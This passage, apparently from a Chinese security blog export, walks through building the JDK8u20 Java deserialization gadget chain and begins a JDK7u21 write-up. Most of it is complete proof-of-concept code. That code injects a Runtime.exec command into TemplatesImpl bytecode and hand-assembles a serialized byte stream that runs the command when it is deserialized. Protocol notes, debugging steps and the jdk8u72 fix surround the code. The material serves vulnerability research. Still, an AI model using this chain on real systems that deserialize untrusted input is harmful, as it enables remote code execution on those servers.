-1的成员变量会被抛弃\n不过由于Java采用的是先反序列化成员变量，后赋值的方式，因此在对象还未完成成员赋值的这段时间内，虚构成员是能够被其他成员引用的\n因此，通过成员抛弃机制，我们可以向Proxy插入一个虚构的成员变量tmpField，值为BeanContextSupport。\n结合上面try-catch嵌套绕过异常处理的特点，在BeanContextSupport的objectAnnotation数据块写入AnnotationInvocationHandler，这样我们在反序列化时就能得到一个临时的AnnotationInvocationHandler对象\n然后我们要将其提取到Proxy的成员变量h中，因此h需要用TC_REFERENCE引用这个AnnotationInvocationHandler对象\n整个思路都已经梳理完毕了，接着就是构造JDK8u20这条链子\n序列化协议浅析 手动修改序列化字节流需要对Java序列化协议有一定的了解，官方文档 对协议的格式有过详细介绍\n对于一个常见的序列化字节流来说，它的结构大致如下\nSTREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73\t// 表示对象 TC_CLASSDESC - 0x72\t// 描述类 classNmae serialVersionUID newHandle classDescFlags\t// 类描述符 fiedCount\t// 表示成员变量的个数 Fields\t// 描述成员变量名、类型 classAnnotation\t// 一般为 TC_ENDBLOCKDATA superClass\t// 描述父类, 父类成员变量的值一并存放在下面的 classdata newHandle\t// 可以理解为对象的索引 classdata\t// 用于存放成员变量的值、额外写入的数据等 classDescFlags\nfinal static byte SC_WRITE_METHOD = 0x01; //类重写writeObject()方法，或者说添加额外数据, 有 SC_WRITE_METHOD final static byte SC_SERIALIZABLE\t= 0x02; final static byte SC_BLOCK_DATA = 0x08; //if SC_EXTERNALIZABLE final static byte SC_EXTERNALIZABLE\t= 0x04; final static byte SC_ENUM = 0x10; 引用 TC_REFERENCE\nTC_REFERENCE newhandle 示例\npublic class SerializationAnalysis { public static void main(String[] args) throws IOException { Person person = new Person(); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(person); objectOutputStream.writeObject(person); System.out.println(HexBin.encode(byteArrayOutputStream.toByteArray())); //ACED00057372001C53657269616C697A6174696F6E416E616C7973697324506572736F6EA874F222FC4E0D2B0200024900036167654C00046E616D657400124C6A6176612F6C616E672F537472696E673B78700000001274000373756E71007E0002 } static class Person implements Serializable { int age; String name; public Person(){ this.age = 18; this.name = \u0026#34;sun\u0026#34;; } } } 用 SerializationDumper 或者 zker解析\nSTREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 28 - 0x00 1c Value - SerializationAnalysis$Person - 0x53657269616c697a6174696f6e416e616c7973697324506572736f6e serialVersionUID - 0xa8 74 f2 22 fc 4e 0d 2b newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Int - I - 0x49 fieldName Length - 3 - 0x00 03 Value - age - 0x616765 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata SerializationAnalysis$Person values age (int)18 - 0x00 00 00 12 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 3 - 0x00 03 Value - sun - 0x73756e TC_REFERENCE - 0x71 Handle - 8257538 - 0x00 7e 00 02 由于都是Person对象，因此第二个对象直接引用了第一个对象\n手搓JDK7u21链 为了降低难度，我们最好手搓一段JDK7u21链的序列化字节流来加深理解。\n我们可以先了解一下LinkedHashSet的大致结构，再来构造我们的字节流\nimport com.sun.org.apache.xerces.internal.impl.dv.util.HexBin; import java.io.*; import java.util.LinkedHashSet; public class SerializationAnalysis { public static void main(String[] args) throws IOException{ HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); LinkedHashSet\u0026lt;Object\u0026gt; linkedHashSet = new LinkedHashSet\u0026lt;\u0026gt;(); linkedHashSet.add(hashMap); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(linkedHashSet); System.out.println(HexBin.encode(byteArrayOutputStream.toByteArray())); } } SerializationDumper解析字节流\nSTREAM_MAGIC - 0xac ed\t//魔数 STREAM_VERSION - 0x00 05\t//版本号 Contents TC_OBJECT - 0x73\t//表示为对象 TC_CLASSDESC - 0x72\t//描述类 className Length - 23 - 0x00 17 Value - java.util.LinkedHashSet - 0x6a6176612e7574696c2e4c696e6b656448617368536574 serialVersionUID - 0xd8 6c d7 5a 95 dd 2a 1e newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE\t//类描述符 fieldCount - 0 - 0x00 00\t//成员变量个数 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc\t//描述类 TC_CLASSDESC - 0x72 className Length - 17 - 0x00 11 Value - java.util.HashSet - 0x6a6176612e7574696c2e48617368536574 serialVersionUID - 0xba 44 85 95 96 b8 b7 34 newHandle 0x00 7e 00 01 classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata java.util.HashSet values objectAnnotation TC_BLOCKDATA - 0x77 Length - 12 - 0x0c Contents - 0x000000103f40000000000001\t//末尾表示元素个数 //linkedHashSet的第一个元素 hashMap TC_ENDBLOCKDATA - 0x78 java.util.LinkedHashSet values hashMap部分我做了简化，因为它的内部不涉及任何改动，所以直接用hashMap表示了~\n读懂之后，我们开始进行JDK7u21原生链的字节流构造\n... Object[] serializedObject = new Object[]{ STREAM_MAGIC, STREAM_VERSION, //Contents TC_OBJECT, TC_CLASSDESC, //className LinkedHashSet.class.getName(), //seriavalVersionUID -2851667679971038690L, //classDescFlags (byte)SC_SERIALIZABLE, //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_CLASSDESC, //className HashSet.class.getName(), //seriavalVersionUID -5024744406713321676L, //classDescFlags (byte)(SC_WRITE_METHOD|SC_SERIALIZABLE), //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_NULL, //classdata //java.util.HashSet //ObjectAnnotation TC_BLOCKDATA, (byte)12, (short)0, (short)16, (short)16192, (short)0, (short)0, (short)2, //元素个数 //contents //LinkedHashSet的第一个元素 templatesImpl, //LinkedHashSet的第二个元素 proxy, TC_ENDBLOCKDATA }; ... 在构造时要注意以下细节：\n根据数据长度选择合适的类型，例如0x01选择byte类型，0x00 02选择short类型（或者直接往里塞0x00，用不着这么麻烦） 忽略newHandle，上面的newHandle是SerializationDumper为了使用者方便分析而自行添加的。真正的newHandle在反序列化时才被分配 运行之后发现并没有弹出计算器\n原因是proxy里面memberValue的templatesImpl没有引用LinkedHashSet的templatesImpl，所以不是同一个对象\n所以我们要重新构造proxy的部分\npublic class SerializationAnalysis { public static class test{ } public static void main(String[] args) throws IOException, ClassNotFoundException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; annotationHandlerInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); annotationHandlerInvocationHandlerConstructor.setAccessible(true); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;f5a5a608\u0026#34;, templatesImpl); InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); Object[] serializedObject = new Object[]{ STREAM_MAGIC, STREAM_VERSION, //Contents TC_OBJECT, TC_CLASSDESC, //className LinkedHashSet.class.getName(), //seriavalVersionUID -2851667679971038690L, //classDescFlags (byte)SC_SERIALIZABLE, //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_CLASSDESC, //className HashSet.class.getName(), //seriavalVersionUID -5024744406713321676L, //classDescFlags (byte)(SC_WRITE_METHOD|SC_SERIALIZABLE), //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_NULL, //classdata //java.util.HashSet //ObjectAnnotation TC_BLOCKDATA, (byte)12, (short)0, (short)16, (short)16192, (short)0, (short)0, (short)2, //元素个数 //contents //LinkedHashSet的第一个元素templatesImpl templatesImpl, //LinkedHashSet的第二个元素proxy TC_OBJECT, TC_PROXYCLASSDESC, 1, Templates.class.getName(), TC_ENDBLOCKDATA, //superclass TC_CLASSDESC, Proxy.class.getName(), -2222568056686623797L, SC_SERIALIZABLE, (short)1, //这里需要填上L, 所以就不用getName了 //另外注意后面要加分号 (byte) \u0026#39;L\u0026#39;, \u0026#34;h\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/reflect/InvocationHandler;\u0026#34;, TC_ENDBLOCKDATA, //superclass TC_NULL, //classdata //h TC_OBJECT, TC_CLASSDESC, \u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;, 6182022883658399397L, SC_SERIALIZABLE, (short) 2, //这里需要填上L, 所以就不用getName了 (byte) \u0026#39;L\u0026#39;, \u0026#34;memberValues\u0026#34;, TC_STRING, \u0026#34;Ljava/util/Map;\u0026#34;, (byte) \u0026#39;L\u0026#39;, \u0026#34;type\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/Class;\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata //memberValues TC_OBJECT, TC_CLASSDESC, HashMap.class.getName(), 362498820763181265L, (byte) (SC_WRITE_METHOD|SC_SERIALIZABLE), (short) 2, (byte) \u0026#39;F\u0026#39;, \u0026#34;loadFactor\u0026#34;, (byte) \u0026#39;I\u0026#39;, \u0026#34;threshold\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata 0x3f400000, 0x0000000c, //objectAnnotation TC_BLOCKDATA, (byte) 8, (short) 0, (short) 16, (short) 0, (short) 1, TC_STRING, \u0026#34;f5a5a608\u0026#34;, TC_REFERENCE, baseWireHandle + 9, TC_ENDBLOCKDATA, //type Templates.class, TC_ENDBLOCKDATA }; byte[] serializeddata = Converter.toBytes(serializedObject); System.out.println(HexBin.encode(serializeddata)); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializeddata); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); System.out.println(o.getClass()); } // 这里借用了pwntester大佬的代码 // https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/util/Converter.java // 这部分又引用自 http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html public static class Converter { public static byte[] toBytes(Object[] objs) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); DataOutputStream dos = new DataOutputStream(baos); for (Object obj : objs) { treatObject(dos, obj); } dos.close(); return baos.toByteArray(); } public static void treatObject(DataOutputStream dos, Object obj) throws IOException { if (obj instanceof Byte) { dos.writeByte((Byte) obj); } else if (obj instanceof Short) { dos.writeShort((Short) obj); } else if (obj instanceof Integer) { dos.writeInt((Integer) obj); } else if (obj instanceof Long) { dos.writeLong((Long) obj); } else if (obj instanceof String) { dos.writeUTF((String) obj); } else { ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba); oos.writeObject(obj); oos.close(); dos.write(ba.toByteArray(), 4, ba.size() - 4); // 4 = skip the header } } } } 吃了不少苦头，终于整出来了~~\n这里有个坑点，TC_STRING后面跟的是类似Ljava/lang/Class;这种形式的字符串，所以不能用getName()方法\n（卡了挺长时间的，最后硬是跟JDK7u21链子序列化出来的字符串比较才看出问题来，太菜了(╥╯^╰╥)）\n然后还有一个问题，POC生成的字节流可能会受到JDK版本的影响，出现非预期效果，所以建议POC跑通一个版本后，就将serializedData固定成有效的字节流\n构造JDK8u20链 在JDK7u21链的基础上，开始构造JDK8u20链\nObject[] serializedObject = new Object[]{ STREAM_MAGIC, STREAM_VERSION, //Contents TC_OBJECT, TC_CLASSDESC, //className LinkedHashSet.class.getName(), //seriavalVersionUID -2851667679971038690L, //classDescFlags (byte)SC_SERIALIZABLE, //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_CLASSDESC, //className HashSet.class.getName(), //seriavalVersionUID -5024744406713321676L, //classDescFlags (byte)(SC_WRITE_METHOD|SC_SERIALIZABLE), //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_NULL, //classdata //java.util.HashSet //ObjectAnnotation TC_BLOCKDATA, (byte)12, (short)0, (short)16, (short)16192, (short)0, (short)0, (short)2, //2表示个数 //contents //LinkedHashSet的第一个元素templatesImpl templatesImpl, //LinkedHashSet的第二个元素proxy TC_OBJECT, TC_PROXYCLASSDESC, 1, Templates.class.getName(), TC_ENDBLOCKDATA, //superclass TC_CLASSDESC, Proxy.class.getName(), -2222568056686623797L, SC_SERIALIZABLE, (short)2, (byte) \u0026#39;L\u0026#39;, \u0026#34;tmpFiled\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/Object;\u0026#34;, (byte) \u0026#39;L\u0026#39;, \u0026#34;h\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/reflect/InvocationHandler;\u0026#34;, TC_ENDBLOCKDATA, //superclass TC_NULL, //classdata //tmpFiled --\u0026gt; BeanContextSupport TC_OBJECT, TC_CLASSDESC, BeanContextSupport.class.getName(), -4879613978649577204L, (byte) (SC_WRITE_METHOD|SC_SERIALIZABLE), (short) 1, (byte) \u0026#39;I\u0026#39;, \u0026#34;serializable\u0026#34;, //只需要serialzable这一个成员变量 TC_ENDBLOCKDATA, //superclass --\u0026gt; BeanContextChildSupport TC_CLASSDESC, BeanContextChildSupport.class.getName(), 6328947014421475877L, SC_SERIALIZABLE, //简化处理, 不用加上SC_WRITE_METHOD, 用不到 (short) 1, (byte) \u0026#39;L\u0026#39;, \u0026#34;beanContextChildPeer\u0026#34;, TC_STRING, \u0026#34;Ljava/beans/beancontext/BeanContextChild;\u0026#34;, TC_ENDBLOCKDATA, //superclass TC_NULL, //classdata //beanContextChildPeer TC_REFERENCE, baseWireHandle + 22, //引用beanContextSupport //classdata //serializable 1, //objectAnnotation TC_OBJECT, TC_CLASSDESC, \u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;, 6182022883658399397L, (byte) (SC_SERIALIZABLE), (short) 2, (byte) \u0026#39;L\u0026#39;, \u0026#34;memberValues\u0026#34;, TC_STRING, \u0026#34;Ljava/util/Map;\u0026#34;, (byte) \u0026#39;L\u0026#39;, \u0026#34;type\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/Class;\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata //memberValues TC_OBJECT, TC_CLASSDESC, HashMap.class.getName(), 362498820763181265L, (byte) (SC_WRITE_METHOD|SC_SERIALIZABLE), (short) 2, (byte) \u0026#39;F\u0026#39;, \u0026#34;loadFactor\u0026#34;, (byte) \u0026#39;I\u0026#39;, \u0026#34;threshold\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata 0x3f400000, 0x0000000c, //objectAnnotation TC_BLOCKDATA, (byte) 8, (short) 0, (short) 16, (short) 0, (short) 1, TC_STRING, \u0026#34;f5a5a608\u0026#34;, TC_REFERENCE, baseWireHandle + 8, //引用templatesImpl TC_ENDBLOCKDATA, //type Templates.class, TC_BLOCKDATA, (byte)4, 0, TC_ENDBLOCKDATA, //这里把count置0 //h TC_REFERENCE, baseWireHandle + 26, TC_ENDBLOCKDATA }; 疑惑点 这段代码按理来说应该没什么问题，但是在反序列化AnnotationInvocationHandler类时却抛出了一个EOFException异常\n断点调试BeanContextSupport.readObject\n进入ObjectInputStream.refill\n这里会进入readBlockHeader方法\n由于defaultDataEnd == true，因此会in.read()会返回-1\nch1 == ch2 == ch3 == ch4 == -1，所以抛出EOFException\n涉及改动defaultDataEnd的方法一共有3个\n我们逐步下个断点，看看defaultDataEnd是怎么变成true的\n看到defaultReadObject()\n进入curDesc.hasWriteObjectData()\nhasWriteObjectData 在 readNonProxy方法中被修改\n因为AnnotationInvocationHandler的classDescFlags没有写入SC_WRITE_METHOD，所以defaultDataEnd == true，抛出了异常\n所以我们只要将AnnotationInvocationHandler类的classDescFlags修改成(byte) (SC_SERIALIZABLE|SC_WRITE_METHOD)即可\n但是这里要注意，AnnotationInvocationHandler并没有重写writeObject方法，所以readObject也不会读取objectAnnotation内的数据，不要往里面写入数据，不然后面解析的时候反而会报错\nPOC\npublic class jdk8u20Chain { public static class test{ } public static void main(String[] args) throws IOException, ClassNotFoundException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; ctClass.makeClassInitializer().insertBefore(cmd); ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = ctClass.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Object[] serializedObject = new Object[]{ STREAM_MAGIC, STREAM_VERSION, //Contents TC_OBJECT, TC_CLASSDESC, //className LinkedHashSet.class.getName(), //seriavalVersionUID -2851667679971038690L, //classDescFlags (byte)SC_SERIALIZABLE, //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_CLASSDESC, //className HashSet.class.getName(), //seriavalVersionUID -5024744406713321676L, //classDescFlags (byte)(SC_WRITE_METHOD|SC_SERIALIZABLE), //fieldCount (short)0, //classAnnotations TC_ENDBLOCKDATA, //superClassDesc TC_NULL, //classdata //java.util.HashSet //ObjectAnnotation TC_BLOCKDATA, (byte)12, (short)0, (short)16, (short)16192, (short)0, (short)0, (short)2, //最后一个2表示元素个数 //contents //LinkedHashSet的第一个元素templatesImpl templatesImpl, //LinkedHashSet的第二个元素proxy TC_OBJECT, TC_PROXYCLASSDESC, 1, Templates.class.getName(), TC_ENDBLOCKDATA, //superclass TC_CLASSDESC, Proxy.class.getName(), -2222568056686623797L, SC_SERIALIZABLE, (short)2, //这里需要填上L, 所以就不用getName了 //另外注意后面要加分号 (byte) \u0026#39;L\u0026#39;, \u0026#34;tmpFiled\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/Object;\u0026#34;, (byte) \u0026#39;L\u0026#39;, \u0026#34;h\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/reflect/InvocationHandler;\u0026#34;, TC_ENDBLOCKDATA, //superclass TC_NULL, //classdata //tmpFiled --\u0026gt; BeanContextSupport TC_OBJECT, TC_CLASSDESC, BeanContextSupport.class.getName(), -4879613978649577204L, (byte) (SC_WRITE_METHOD|SC_SERIALIZABLE), (short) 1, (byte) \u0026#39;I\u0026#39;, \u0026#34;serializable\u0026#34;, //只需要serialzable这一个成员变量 TC_ENDBLOCKDATA, //superclass --\u0026gt; BeanContextChildSupport TC_CLASSDESC, BeanContextChildSupport.class.getName(), 6328947014421475877L, SC_SERIALIZABLE, //简化处理, 不用加上SC_WRITE_METHOD, 因为用不到 (short) 1, (byte) \u0026#39;L\u0026#39;, \u0026#34;beanContextChildPeer\u0026#34;, TC_STRING, \u0026#34;Ljava/beans/beancontext/BeanContextChild;\u0026#34;, TC_ENDBLOCKDATA, //superclass TC_NULL, //classdata //BeanContextChildSupport //beanContextChildPeer TC_REFERENCE, baseWireHandle + 25, //引用beanContextSupport对象 //BeanContextSupport //serializable 1, //objectAnnotation TC_OBJECT, TC_CLASSDESC, \u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;, 6182022883658399397L, (byte) (SC_SERIALIZABLE|SC_WRITE_METHOD), //SC_WRITE_METHOD可不能省略了,运行到readBlockHeader()会有问题 // 不过这里的objectAnnotation可以不用加 (short) 2, //这里需要填上L, 所以就不用getName了 (byte) \u0026#39;L\u0026#39;, \u0026#34;memberValues\u0026#34;, TC_STRING, \u0026#34;Ljava/util/Map;\u0026#34;, (byte) \u0026#39;L\u0026#39;, \u0026#34;type\u0026#34;, TC_STRING, \u0026#34;Ljava/lang/Class;\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata //memberValues TC_OBJECT, TC_CLASSDESC, HashMap.class.getName(), 362498820763181265L, (byte) (SC_WRITE_METHOD|SC_SERIALIZABLE), (short) 2, (byte) \u0026#39;F\u0026#39;, \u0026#34;loadFactor\u0026#34;, (byte) \u0026#39;I\u0026#39;, \u0026#34;threshold\u0026#34;, TC_ENDBLOCKDATA, TC_NULL, //classdata 0x3f400000, 0x0000000c, //objectAnnotation TC_BLOCKDATA, (byte) 8, (short) 0, (short) 16, (short) 0, (short) 1, TC_STRING, \u0026#34;f5a5a608\u0026#34;, TC_REFERENCE, baseWireHandle + 10, //引用templatesImpl TC_ENDBLOCKDATA, //type Templates.class, TC_BLOCKDATA, (byte)4, 0, TC_ENDBLOCKDATA, //这里把count置0 //h TC_REFERENCE, baseWireHandle + 29, TC_ENDBLOCKDATA }; // byte[] serializeddata = byteArrayOutputStream.toByteArray(); // byte[] serializedData = Converter.toBytes(serializedObject); serializedData = Replace(serializedData, \u0026#34;5f6e616d6571007e0001\u0026#34;, \u0026#34;5f6e616d657400124c6a6176612f6c616e672f537472696e673b\u0026#34;); System.out.println(HexBin.encode(serializedData)); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); System.out.println(o.getClass()); } // 这里直接借用了现成的代码 // 引用自 http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html public static class Converter { public static byte[] toBytes(Object[] objs) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); DataOutputStream dos = new DataOutputStream(baos); for (Object obj : objs) { treatObject(dos, obj); } dos.close(); return baos.toByteArray(); } public static void treatObject(DataOutputStream dos, Object obj) throws IOException { if (obj instanceof Byte) { dos.writeByte((Byte) obj); } else if (obj instanceof Short) { dos.writeShort((Short) obj); } else if (obj instanceof Integer) { dos.writeInt((Integer) obj); } else if (obj instanceof Long) { dos.writeLong((Long) obj); } else if (obj instanceof String) { dos.writeUTF((String) obj); } else { ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba); oos.writeObject(obj); oos.close(); dos.write(ba.toByteArray(), 4, ba.size() - 4); // 4 = skip the header } } } //原生的replace()方法貌似没用, 只好重写了一个Replace()方法 public static \u0026lt;T\u0026gt; byte[] Replace(byte[] bytes, T target, T replacement) { byte[] targetB, replacementB; int i, j; if (target instanceof String) targetB = HexBin.decode((String) target); else targetB = (byte[]) target; if (replacement instanceof String) replacementB = HexBin.decode((String) replacement); else replacementB = (byte[]) replacement; byte[] newbytes = new byte[bytes.length + replacementB.length - targetB.length]; for (i = 0, j = 0; i \u0026lt; targetB.length \u0026amp;\u0026amp; j \u0026lt; bytes.length; j++) { if (targetB[i] == bytes[j]) i ++; else i = 0; } // if (j == bytes.length) throw new RuntimeException(\u0026#34;Unable to match target!\u0026#34;); if (j == bytes.length) System.out.println(\u0026#34;Method-Replace: Unable to match target!\u0026#34;); System.arraycopy(bytes,0, newbytes,0, j - targetB.length); System.arraycopy(replacementB, 0, newbytes, j - targetB.length, replacementB.length); System.arraycopy(bytes, j, newbytes, j - targetB.length + replacementB.length , bytes.length - j); return newbytes; } } ps：在构造POC的过程中还碰到很多问题，比如实际字节流和预期字节流不符（点名hashMap，_name竟然引用了templates，最后只好手动修改字节流）、JDK7u21貌似跑不通JDK8u20链（可能是我的原因）等等\n构造POC的其他思路 以一种更简单的方式构造JRE8u20 Gadget——feihong师傅 JDK8u20反序列化漏洞新型PoC思路及具体实现 (qq.com) ——沈沉舟师傅 \u0026hellip; 高版本修复 从jdk8u72-b12 版本开始，JDK对JDK8u20链的AnnotationInvocationHandler进行了限制\njdk8u72-b12(2015-12-08)修补方案\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { - s.defaultReadObject(); + ObjectInputStream.GetField fields = s.readFields(); + + @SuppressWarnings(\u0026#34;unchecked\u0026#34;) + Class\u0026lt;? extends Annotation\u0026gt; t = (Class\u0026lt;? extends Annotation\u0026gt;)fields.get(\u0026#34;type\u0026#34;, null); + @SuppressWarnings(\u0026#34;unchecked\u0026#34;) + Map\u0026lt;String, Object\u0026gt; streamVals = (Map\u0026lt;String, Object\u0026gt;)fields.get(\u0026#34;memberValues\u0026#34;, null); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { - annotationType = AnnotationType.getInstance(type); + annotationType = AnnotationType.getInstance(t); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } JDK8u72不再调用s.defaultReadObject()，转而使用s.readFields()\n这样我们就获取不到完整的AnnotationInvocationHandler对象了\nps：写这篇文章的时候忘了晚上有课，结果小组活动分和平时分都没了，痛！太痛了！┭┮﹏┭┮\n参考链接 JRE8u20_RCE_Gadget/POCloitGenerator.java at master · pwntester/JRE8u20_RCE_Gadget · GitHub\nJDK8u20反序列化总结 - 跳跳糖 (tttang.com)\nJDK8u20反序列化漏洞新型PoC思路及具体实现 (qq.com)\nJRE8u20反序列化漏洞分析 - FreeBuf网络安全行业门户\n本文原载于0ZHan\u0026rsquo;s Blog，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。\n","date":"2024-03-25T19:43:24+08:00","permalink":"/p/jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/","title":"JDK8u20原生链"},{"content":"影响范围：JDK\u0026lt;=JDK7u25（有部分版本并行开发，所以影响不到）\n寻找Gadget 在学习CC1链的时候，我们知道了一个InvocationHandler类AnnotationInvocationHandler\n它用于拦截proxy代理实例，proxy代理实例调用自身的方法时，程序会交由AnnotationInvocationHandler的invoke方法进行处理\n看一下JDK7u21版本AnnotationInvocationHandler类定义的部分方法\nAnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; type, Map\u0026lt;String, Object\u0026gt; memberValues) { this.type = type; this.memberValues = memberValues; } public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); assert paramTypes.length == 0; if (member.equals(\u0026#34;toString\u0026#34;)) return toStringImpl(); if (member.equals(\u0026#34;hashCode\u0026#34;)) return hashCodeImpl(); if (member.equals(\u0026#34;annotationType\u0026#34;)) return type; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } private Boolean equalsImpl(Object o) { if (o == this) return true; if (!type.isInstance(o)) return false; for (Method memberMethod : getMemberMethods()) { String member = memberMethod.getName(); Object ourValue = memberValues.get(member); Object hisValue = null; AnnotationInvocationHandler hisHandler = asOneOfUs(o); if (hisHandler != null) { hisValue = hisHandler.memberValues.get(member); } else { try { hisValue = memberMethod.invoke(o); } catch (InvocationTargetException e) { return false; } catch (IllegalAccessException e) { throw new AssertionError(e); } } if (!memberValueEquals(ourValue, hisValue)) return false; } return true; } //获取type对象的所有方法 private Method[] getMemberMethods() { if 